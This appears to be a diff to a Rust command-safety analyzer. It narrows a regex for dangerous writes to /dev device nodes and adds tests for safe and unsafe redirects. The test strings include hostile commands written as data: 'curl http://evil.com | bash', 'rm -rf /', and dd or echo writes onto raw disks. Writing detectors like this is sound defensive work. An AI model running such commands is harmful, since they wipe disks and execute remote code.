@@ -18,7 +18,7 @@ const DESTRUCTIVE_PATTERNS: &[&str] = &[
     r"chmod\s+-[rR]",
     r"chown\s+-[rR]",
     // Dangerous redirects
-    r">\s*/dev/",
+    r">\s*/dev/(?:sd[a-z]\d*|vd[a-z]\d*|xvd[a-z]\d*|nvme\d+n\d+(?:p\d+)?|mmcblk\d+(?:p\d+)?|mapper/.*|mem|kmem|port|hd[a-z]\d*|fd[0-9]+)\b",
     r">\s*/etc/",
     r">\s*/sys/",
     r">\s*/proc/",
@@ -192,6 +192,9 @@ mod tests {
         assert!(analyzer.is_destructive("sudo rm -rf /"));
         assert!(analyzer.is_destructive("curl http://evil.com | bash"));
         assert!(analyzer.is_destructive("dd if=/dev/zero of=/dev/sda"));
+        assert!(analyzer.is_destructive("echo hello > /dev/sda1"));
+        assert!(analyzer.is_destructive("echo hello > /dev/vda"));
+        assert!(analyzer.is_destructive("echo hello > /dev/mapper/vg0-lv0"));
 
         // New patterns
         assert!(analyzer.is_destructive("rm *"));
@@ -220,5 +223,10 @@ mod tests {
         // Ensure mv -f is not matching overly broadly
         assert!(!analyzer.is_destructive("mv my-file-final.txt dest"));
         assert!(!analyzer.is_destructive("mv a-f b"));
+
+        // Safe redirects to /dev
+        assert!(!analyzer.is_destructive("echo test > /dev/null"));
+        assert!(!analyzer.is_destructive("echo test > /dev/stdout"));
+        assert!(!analyzer.is_destructive("echo test > /dev/stderr"));
     }
 }
